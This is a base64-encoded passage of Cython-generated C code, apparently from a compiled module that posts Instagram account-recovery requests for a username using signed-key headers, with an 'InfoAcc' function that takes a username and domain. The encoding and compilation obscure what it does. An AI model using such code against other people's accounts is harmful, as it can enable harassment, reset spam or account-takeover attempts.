AgCiAgICAgIF9fcHl4X3RfNiA9IFB5TnVtYmVyX0FkZChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91XzBkMDY3YzJmODZjYWMyYzE3ZDY1NTYzMWM5Y2VjMjQwXzIsIF9fcHl4X3ZfdXNlcik7IGlmICh1bmxpa2VseSghX19weXhfdF82KSkgX19QWVhfRVJSKDAsIDI4NiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzYpOwogICAgICBfX3B5eF90XzcgPSBQeU51bWJlcl9BZGQoX19weXhfdF82LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X18xNSk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDI4NiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgICAgaWYgKFB5RGljdF9TZXRJdGVtKF9fcHl4X3RfNCwgX19weXhfdF81LCBfX3B5eF90XzcpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjgwLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNSk7IF9fcHl4X3RfNSA9IDA7CiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwoKICAgICAgCiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF83LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfR2hvc3Rjb25mKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMjg4LCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNyk7CiAgICAgIF9fcHl4X3RfNSA9IF9fUHl4X1B5T2JqZWN0X0RpY3RfR2V0SXRlbShfX3B5eF90XzcsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pZ19zaWdfa2V5X3ZlcnNpb24pOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfNSkpIF9fUFlYX0VSUigwLCAyODgsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF81KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfNyk7IF9fcHl4X3RfNyA9IDA7CiAgICAgIGlmIChQeURpY3RfU2V0SXRlbShfX3B5eF90XzQsIF9fcHl4X3RfNSwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfa3BfdV80KSA8ICgwKSkgX19QWVhfRVJSKDAsIDI4MCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICBfX3B5eF92X2RhdGEgPSAoKFB5T2JqZWN0KilfX3B5eF90XzQpOwogICAgICBfX3B5eF90XzQgPSAwOwoKICAgICAgCiAgICAgIF9fcHl4X3RfNiA9IE5VTEw7CiAgICAgIF9fUHl4X0dldE1vZHVsZUdsb2JhbE5hbWUoX19weXhfdF84LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3Vfc2Vzc2lvbik7IGlmICh1bmxpa2VseSghX19weXhfdF84KSkgX19QWVhfRVJSKDAsIDI5MCwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpOwogICAgICBfX3B5eF90XzkgPSBfX1B5eF9QeU9iamVjdF9HZXRBdHRyU3RyKF9fcHl4X3RfOCwgX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3Bvc3QpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOSkpIF9fUFlYX0VSUigwLCAyOTAsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF85KTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CgogICAgICAKICAgICAgX19QeXhfR2V0TW9kdWxlR2xvYmFsTmFtZShfX3B5eF90XzgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9HaG9zdGNvbmYpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAyOTEsIF9fcHl4X0wzX2Vycm9yKQogICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF84KTsKICAgICAgX19weXhfdF8xMCA9IF9fUHl4X1B5T2JqZWN0X0RpY3RfR2V0SXRlbShfX3B5eF90XzgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9pbnN0YWdyYW1fcmVjb3ZlcnlfdXJsKTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzEwKSkgX19QWVhfRVJSKDAsIDI5MSwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzEwKTsKICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgIF9fcHl4X3RfMTEgPSAxOwogICAgICAjaWYgQ1lUSE9OX1VOUEFDS19NRVRIT0RTCiAgICAgIGlmICh1bmxpa2VseShQeU1ldGhvZF9DaGVjayhfX3B5eF90XzkpKSkgewogICAgICAgIF9fcHl4X3RfNiA9IFB5TWV0aG9kX0dFVF9TRUxGKF9fcHl4X3RfOSk7CiAgICAgICAgYXNzZXJ0KF9fcHl4X3RfNik7CiAgICAgICAgUHlPYmplY3QqIF9fcHl4X19mdW5jdGlvbiA9IFB5TWV0aG9kX0dFVF9GVU5DVElPTihfX3B5eF90XzkpOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzYpOwogICAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgIF9fUHl4X0RFQ1JFRl9TRVQoX19weXhfdF85LCBfX3B5eF9fZnVuY3Rpb24pOwogICAgICAgIF9fcHl4X3RfMTEgPSAwOwogICAgICB9CiAgICAgICNlbmRpZgogICAgICB7CiAgICAgICAgUHlPYmplY3QgKl9fcHl4X2NhbGxhcmdzWzIgKyAoKENZVEhPTl9WRUNUT1JDQUxMKSA/IDIgOiAwKV0gPSB7X19weXhfdF82LCBfX3B5eF90XzEwfTsKICAgICAgICBfX3B5eF90XzggPSBfX1B5eF9NYWtlVmVjdG9yY2FsbEJ1aWxkZXJLd2RzKDIpOyBpZiAodW5saWtlbHkoIV9fcHl4X3RfOCkpIF9fUFlYX0VSUigwLCAyOTAsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzgpOwogICAgICAgIGlmIChfX1B5eF9WZWN0b3JjYWxsQnVpbGRlcl9BZGRBcmcoX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2hlYWRlcnMsIF9fcHl4X3ZfaGVhZGVycywgX19weXhfdF84LCBfX3B5eF9jYWxsYXJncysyLCAwKSA8ICgwKSkgX19QWVhfRVJSKDAsIDI5MCwgX19weXhfTDNfZXJyb3IpCiAgICAgICAgaWYgKF9fUHl4X1ZlY3RvcmNhbGxCdWlsZGVyX0FkZEFyZyhfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZGF0YSwgX19weXhfdl9kYXRhLCBfX3B5eF90XzgsIF9fcHl4X2NhbGxhcmdzKzIsIDEpIDwgKDApKSBfX1BZWF9FUlIoMCwgMjkwLCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX3B5eF90XzcgPSBfX1B5eF9PYmplY3RfVmVjdG9yY2FsbF9DYWxsRnJvbUJ1aWxkZXIoX19weXhfdF85LCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzExLCAoMi1fX3B5eF90XzExKSB8IChfX3B5eF90XzExKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCksIF9fcHl4X3RfOCk7CiAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzYpOyBfX3B5eF90XzYgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7CiAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzcpKSBfX1BZWF9FUlIoMCwgMjkwLCBfX3B5eF9MM19lcnJvcikKICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF83KTsKICAgICAgfQogICAgICBfX3B5eF90XzUgPSBfX3B5eF90Xzc7CiAgICAgIF9fUHl4X0lOQ1JFRihfX3B5eF90XzUpOwogICAgICBfX3B5eF90XzExID0gMDsKICAgICAgewogICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1syXSA9IHtfX3B5eF90XzUsIE5VTEx9OwogICAgICAgIF9fcHl4X3RfNCA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsTWV0aG9kKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X25fdV9qc29uLCBfX3B5eF9jYWxsYXJncytfX3B5eF90XzExLCAoMS1fX3B5eF90XzExKSB8ICgxKl9fUHl4X1BZX1ZFQ1RPUkNBTExfQVJHVU1FTlRTX09GRlNFVCkpOwogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgICAgICBpZiAodW5saWtlbHkoIV9fcHl4X3RfNCkpIF9fUFlYX0VSUigwLCAyOTEsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzQpOwogICAgICB9CiAgICAgIF9fcHl4X3ZfcmVzcG9uc2UgPSBfX3B5eF90XzQ7CiAgICAgIF9fcHl4X3RfNCA9IDA7CgogICAgICAKICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF9yKTsKICAgICAgX19weXhfdF80ID0gX19QeXhfUHlPYmplY3RfR2V0QXR0clN0cihfX3B5eF92X3Jlc3BvbnNlLCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZ2V0KTsgaWYgKHVubGlrZWx5KCFfX3B5eF90XzQpKSBfX1BZWF9FUlIoMCwgMjkyLCBfX3B5eF9MM19lcnJvcikKICAgICAgX19QeXhfR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgIF9fcHl4X3RfNyA9IF9fUHl4X1B5T2JqZWN0X0NhbGwoX19weXhfdF80LCBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF90dXBsZVs0XSwgTlVMTCk7IGlmICh1bmxpa2VseSghX19weXhfdF83KSkgX19QWVhfRVJSKDAsIDI5MiwgX19weXhfTDNfZXJyb3IpCiAgICAgIF9fUHl4X0dPVFJFRihfX3B5eF90XzcpOwogICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgICAgX19weXhfciA9IF9fcHl4X3RfNzsKICAgICAgX19weXhfdF83ID0gMDsKICAgICAgZ290byBfX3B5eF9MN190cnlfcmV0dXJuOwoKICAgICAgCiAgICB9CiAgICBfX3B5eF9MM19lcnJvcjo7CiAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfMTApOyBfX3B5eF90XzEwID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF80KTsgX19weXhfdF80ID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsgX19weXhfdF81ID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF82KTsgX19weXhfdF82ID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF83KTsgX19weXhfdF83ID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsgX19weXhfdF84ID0gMDsKICAgIF9fUHl4X1hERUNSRUYoX19weXhfdF85KTsgX19weXhfdF85ID0gMDsKCiAgICAKICAgIF9fcHl4X3RfMTIgPSBfX1B5eF9QeUVycl9FeGNlcHRpb25NYXRjaGVzKCgoUHlPYmplY3QgKikoKChQeVR5cGVPYmplY3QqKVB5RXhjX0V4Y2VwdGlvbikpKSk7CiAgICBpZiAoX19weXhfdF8xMikgewogICAgICBfX1B5eF9BZGRUcmFjZWJhY2soImF3LnJlc3QiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICAgICAgaWYgKF9fUHl4X0dldEV4Y2VwdGlvbigmX19weXhfdF83LCAmX19weXhfdF80LCAmX19weXhfdF81KSA8IDApIF9fUFlYX0VSUigwLCAyOTMsIF9fcHl4X0w1X2V4Y2VwdF9lcnJvcikKICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzcpOwogICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfNCk7CiAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF81KTsKICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X3RfNCk7CiAgICAgIF9fcHl4X3ZfZSA9IF9fcHl4X3RfNDsKICAgICAgIHsKCiAgICAgICAgCiAgICAgICAgX19weXhfdF84ID0gTlVMTDsKICAgICAgICBfX1B5eF9JTkNSRUYoX19weXhfYnVpbHRpbl9wcmludCk7CiAgICAgICAgX19weXhfdF8xMCA9IF9fcHl4X2J1aWx0aW5fcHJpbnQ7IAogICAgICAgIF9fcHl4X3RfMTEgPSAxOwogICAgICAgIHsKICAgICAgICAgIFB5T2JqZWN0ICpfX3B5eF9jYWxsYXJnc1szXSA9IHtfX3B5eF90XzgsIF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3VfcmVzdF9lcnJvcl9pbl9mdW5jdGlvbiwgX19weXhfdl9lfTsKICAgICAgICAgIF9fcHl4X3RfOSA9IF9fUHl4X1B5T2JqZWN0X0Zhc3RDYWxsKF9fcHl4X3RfMTAsIF9fcHl4X2NhbGxhcmdzK19fcHl4X3RfMTEsICgzLV9fcHl4X3RfMTEpIHwgKF9fcHl4X3RfMTEqX19QeXhfUFlfVkVDVE9SQ0FMTF9BUkdVTUVOVFNfT0ZGU0VUKSk7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgICAgICBfX1B5eF9ERUNSRUYoX19weXhfdF8xMCk7IF9fcHl4X3RfMTAgPSAwOwogICAgICAgICAgaWYgKHVubGlrZWx5KCFfX3B5eF90XzkpKSBfX1BZWF9FUlIoMCwgMjk0LCBfX3B5eF9MMTRfZXJyb3IpCiAgICAgICAgICBfX1B5eF9HT1RSRUYoX19weXhfdF85KTsKICAgICAgICB9CiAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7CgogICAgICAgIAogICAgICAgIF9fUHl4X1hERUNSRUYoX19weXhfcik7CiAgICAgICAgX19QeXhfSU5DUkVGKF9fcHl4X21zdGF0ZV9nbG9iYWwtPl9fcHl4X2twX3Vfbm9fcmVzZXQpOwogICAgICAgIF9fcHl4X3IgPSBfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9rcF91X25vX3Jlc2V0OwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzQpOyBfX3B5eF90XzQgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzUpOyBfX3B5eF90XzUgPSAwOwogICAgICAgIF9fUHl4X0RFQ1JFRihfX3B5eF90XzcpOyBfX3B5eF90XzcgPSAwOwogICAgICAgIGdvdG8gX19weXhfTDEzX3JldHVybjsKICAgICAgfQoKICAgICAgCiAgICAgICB7CiAgICAgICAgX19weXhfTDE0X2Vycm9yOjsKICAgICAgICB7CiAgICAgICAgICBfX1B5eF9QeVRocmVhZFN0YXRlX2RlY2xhcmUKICAgICAgICAgIF9fUHl4X1B5VGhyZWFkU3RhdGVfYXNzaWduCiAgICAgICAgICBfX3B5eF90XzE1ID0gMDsgX19weXhfdF8xNiA9IDA7IF9fcHl4X3RfMTcgPSAwOyBfX3B5eF90XzE4ID0gMDsgX19weXhfdF8xOSA9IDA7IF9fcHl4X3RfMjAgPSAwOwogICAgICAgICAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsgX19weXhfdF8xMCA9IDA7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7IF9fcHl4X3RfNiA9IDA7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOCk7IF9fcHl4X3RfOCA9IDA7CiAgICAgICAgICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7IF9fcHl4X3RfOSA9IDA7CiAgICAgICAgICAgX19QeXhfRXhjZXB0aW9uU3dhcCgmX19weXhfdF8xOCwgJl9fcHl4X3RfMTksICZfX3B5eF90XzIwKTsKICAgICAgICAgIGlmICggdW5saWtlbHkoX19QeXhfR2V0RXhjZXB0aW9uKCZfX3B5eF90XzE1LCAmX19weXhfdF8xNiwgJl9fcHl4X3RfMTcpIDwgMCkpIF9fUHl4X0VyckZldGNoKCZfX3B5eF90XzE1LCAmX19weXhfdF8xNiwgJl9fcHl4X3RfMTcpOwogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE1KTsKICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xNik7CiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMTcpOwogICAgICAgICAgX19QeXhfWEdPVFJFRihfX3B5eF90XzE4KTsKICAgICAgICAgIF9fUHl4X1hHT1RSRUYoX19weXhfdF8xOSk7CiAgICAgICAgICBfX1B5eF9YR09UUkVGKF9fcHl4X3RfMjApOwogICAgICAgICAgX19weXhfdF8xMiA9IF9fcHl4X2xpbmVubzsgX19weXhfdF8xMyA9IF9fcHl4X2NsaW5lbm87IF9fcHl4X3RfMTQgPSBfX3B5eF9maWxlbmFtZTsKICAgICAgICAgIHsKICAgICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3ZfZSk7IF9fcHl4X3ZfZSA9IDA7CiAgICAgICAgICB9CiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE4KTsKICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTkpOwogICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8yMCk7CiAgICAgICAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzE4LCBfX3B5eF90XzE5LCBfX3B5eF90XzIwKTsKICAgICAgICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMTUpOwogICAgICAgICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xNik7CiAgICAgICAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzE3KTsKICAgICAgICAgIF9fUHl4X0VyclJlc3RvcmUoX19weXhfdF8xNSwgX19weXhfdF8xNiwgX19weXhfdF8xNyk7CiAgICAgICAgICBfX3B5eF90XzE1ID0gMDsgX19weXhfdF8xNiA9IDA7IF9fcHl4X3RfMTcgPSAwOyBfX3B5eF90XzE4ID0gMDsgX19weXhfdF8xOSA9IDA7IF9fcHl4X3RfMjAgPSAwOwogICAgICAgICAgX19weXhfbGluZW5vID0gX19weXhfdF8xMjsgX19weXhfY2xpbmVubyA9IF9fcHl4X3RfMTM7IF9fcHl4X2ZpbGVuYW1lID0gX19weXhfdF8xNDsKICAgICAgICAgIGdvdG8gX19weXhfTDVfZXhjZXB0X2Vycm9yOwogICAgICAgIH0KICAgICAgICBfX3B5eF9MMTNfcmV0dXJuOiB7CiAgICAgICAgICBfX3B5eF90XzIwID0gX19weXhfcjsKICAgICAgICAgIF9fcHl4X3IgPSAwOwogICAgICAgICAgX19QeXhfREVDUkVGKF9fcHl4X3ZfZSk7IF9fcHl4X3ZfZSA9IDA7CiAgICAgICAgICBfX3B5eF9yID0gX19weXhfdF8yMDsKICAgICAgICAgIF9fcHl4X3RfMjAgPSAwOwogICAgICAgICAgZ290byBfX3B5eF9MNl9leGNlcHRfcmV0dXJuOwogICAgICAgIH0KICAgICAgfQogICAgfQogICAgZ290byBfX3B5eF9MNV9leGNlcHRfZXJyb3I7CgogICAgCiAgICBfX3B5eF9MNV9leGNlcHRfZXJyb3I6OwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8xKTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMik7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzMpOwogICAgX19QeXhfRXhjZXB0aW9uUmVzZXQoX19weXhfdF8xLCBfX3B5eF90XzIsIF9fcHl4X3RfMyk7CiAgICBnb3RvIF9fcHl4X0wxX2Vycm9yOwogICAgX19weXhfTDdfdHJ5X3JldHVybjo7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzEpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8yKTsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMyk7CiAgICBfX1B5eF9FeGNlcHRpb25SZXNldChfX3B5eF90XzEsIF9fcHl4X3RfMiwgX19weXhfdF8zKTsKICAgIGdvdG8gX19weXhfTDA7CiAgICBfX3B5eF9MNl9leGNlcHRfcmV0dXJuOjsKICAgIF9fUHl4X1hHSVZFUkVGKF9fcHl4X3RfMSk7CiAgICBfX1B5eF9YR0lWRVJFRihfX3B5eF90XzIpOwogICAgX19QeXhfWEdJVkVSRUYoX19weXhfdF8zKTsKICAgIF9fUHl4X0V4Y2VwdGlvblJlc2V0KF9fcHl4X3RfMSwgX19weXhfdF8yLCBfX3B5eF90XzMpOwogICAgZ290byBfX3B5eF9MMDsKICB9CgogIAoKICAKICBfX3B5eF9MMV9lcnJvcjo7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzQpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF81KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfNik7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzcpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdF84KTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3RfOSk7CiAgX19QeXhfWERFQ1JFRihfX3B5eF90XzEwKTsKICBfX1B5eF9BZGRUcmFjZWJhY2soImF3LnJlc3QiLCBfX3B5eF9jbGluZW5vLCBfX3B5eF9saW5lbm8sIF9fcHl4X2ZpbGVuYW1lKTsKICBfX3B5eF9yID0gTlVMTDsKICBfX3B5eF9MMDo7CiAgX19QeXhfWERFQ1JFRihfX3B5eF92X2hlYWRlcnMpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9kYXRhKTsKICBfX1B5eF9YREVDUkVGKF9fcHl4X3ZfcmVzcG9uc2UpOwogIF9fUHl4X1hERUNSRUYoX19weXhfdl9lKTsKICBfX1B5eF9YR0lWRVJFRihfX3B5eF9yKTsKICBfX1B5eF9SZWZOYW5ueUZpbmlzaENvbnRleHQoKTsKICByZXR1cm4gX19weXhfcjsKfQoKCgoKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18yYXdfMTVJbmZvQWNjKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCAKI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMClB5T2JqZWN0ICpjb25zdCAqX19weXhfYXJncywgUHlfc3NpemVfdCBfX3B5eF9uYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2Vsc2UKUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzCiNlbmRpZgopOyAKc3RhdGljIFB5TWV0aG9kRGVmIF9fcHl4X21kZWZfMmF3XzE1SW5mb0FjYyA9IHsiSW5mb0FjYyIsIChQeUNGdW5jdGlvbikodm9pZCgqKSh2b2lkKSkoX19QeXhfUHlDRnVuY3Rpb25fRmFzdENhbGxXaXRoS2V5d29yZHMpX19weXhfcHdfMmF3XzE1SW5mb0FjYywgX19QeXhfTUVUSF9GQVNUQ0FMTHxNRVRIX0tFWVdPUkRTLCAwfTsKc3RhdGljIFB5T2JqZWN0ICpfX3B5eF9wd18yYXdfMTVJbmZvQWNjKFB5T2JqZWN0ICpfX3B5eF9zZWxmLCAKI2lmIENZVEhPTl9NRVRIX0ZBU1RDQUxMClB5T2JqZWN0ICpjb25zdCAqX19weXhfYXJncywgUHlfc3NpemVfdCBfX3B5eF9uYXJncywgUHlPYmplY3QgKl9fcHl4X2t3ZHMKI2Vsc2UKUHlPYmplY3QgKl9fcHl4X2FyZ3MsIFB5T2JqZWN0ICpfX3B5eF9rd2RzCiNlbmRpZgopIHsKICBQeU9iamVjdCAqX19weXhfdl91c2VybmFtZSA9IDA7CiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqX19weXhfdl9kb21haW4gPSAwOwogICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTEwKICBDWVRIT05fVU5VU0VEIFB5X3NzaXplX3QgX19weXhfbmFyZ3M7CiAgI2VuZGlmCiAgQ1lUSE9OX1VOVVNFRCBQeU9iamVjdCAqY29uc3QgKl9fcHl4X2t3dmFsdWVzOwogIFB5T2JqZWN0KiB2YWx1ZXNbMl0gPSB7MCwwfTsKICBpbnQgX19weXhfbGluZW5vID0gMDsKICBjb25zdCBjaGFyICpfX3B5eF9maWxlbmFtZSA9IE5VTEw7CiAgaW50IF9fcHl4X2NsaW5lbm8gPSAwOwogIFB5T2JqZWN0ICpfX3B5eF9yID0gMDsKICBfX1B5eF9SZWZOYW5ueURlY2xhcmF0aW9ucwogIF9fUHl4X1JlZk5hbm55U2V0dXBDb250ZXh0KCJJbmZvQWNjICh3cmFwcGVyKSIsIDApOwogICNpZiAhQ1lUSE9OX01FVEhfRkFTVENBTEwKICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX1NJWkUKICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfR0VUX1NJWkUoX19weXhfYXJncyk7CiAgI2Vsc2UKICBfX3B5eF9uYXJncyA9IFB5VHVwbGVfU2l6ZShfX3B5eF9hcmdzKTsgaWYgKHVubGlrZWx5KF9fcHl4X25hcmdzIDwgMCkpIHJldHVybiBOVUxMOwogICNlbmRpZgogICNlbmRpZgogIF9fcHl4X2t3dmFsdWVzID0gX19QeXhfS3dWYWx1ZXNfRkFTVENBTEwoX19weXhfYXJncywgX19weXhfbmFyZ3MpOwogIHsKICAgIFB5T2JqZWN0ICoqIGNvbnN0IF9fcHl4X3B5YXJnbmFtZXNbXSA9IHsmX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X3VzZXJuYW1lLCZfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfZG9tYWluLDB9OwogICAgY29uc3QgUHlfc3NpemVfdCBfX3B5eF9rd2RzX2xlbiA9IChfX3B5eF9rd2RzKSA/IF9fUHl4X051bUt3YXJnc19GQVNUQ0FMTChfX3B5eF9rd2RzKSA6IDA7CiAgICBpZiAodW5saWtlbHkoX19weXhfa3dkc19sZW4pIDwgMCkgX19QWVhfRVJSKDAsIDI5OCwgX19weXhfTDNfZXJyb3IpCiAgICBpZiAoX19weXhfa3dkc19sZW4gPiAwKSB7CiAgICAgIHN3aXRjaCAoX19weXhfbmFyZ3MpIHsKICAgICAgICBjYXNlICAyOgogICAgICAgIHZhbHVlc1sxXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAxKTsKICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1sxXSkpIF9fUFlYX0VSUigwLCAyOTgsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDsKICAgICAgICBjYXNlICAxOgogICAgICAgIHZhbHVlc1swXSA9IF9fUHl4X0FyZ1JlZl9GQVNUQ0FMTChfX3B5eF9hcmdzLCAwKTsKICAgICAgICBpZiAoIUNZVEhPTl9BU1NVTUVfU0FGRV9NQUNST1MgJiYgdW5saWtlbHkoIXZhbHVlc1swXSkpIF9fUFlYX0VSUigwLCAyOTgsIF9fcHl4X0wzX2Vycm9yKQogICAgICAgIENZVEhPTl9GQUxMVEhST1VHSDsKICAgICAgICBjYXNlICAwOiBicmVhazsKICAgICAgICBkZWZhdWx0OiBnb3RvIF9fcHl4X0w1X2FyZ3R1cGxlX2Vycm9yOwogICAgICB9CiAgICAgIGNvbnN0IFB5X3NzaXplX3Qga3dkX3Bvc19hcmdzID0gX19weXhfbmFyZ3M7CiAgICAgIGlmIChfX1B5eF9QYXJzZUtleXdvcmRzKF9fcHl4X2t3ZHMsIF9fcHl4X2t3dmFsdWVzLCBfX3B5eF9weWFyZ25hbWVzLCAwLCB2YWx1ZXMsIGt3ZF9wb3NfYXJncywgX19weXhfa3dkc19sZW4sICJJbmZvQWNjIiwgMCkgPCAoMCkpIF9fUFlYX0VSUigwLCAyOTgsIF9fcHl4X0wzX2Vycm9yKQogICAgICBmb3IgKFB5X3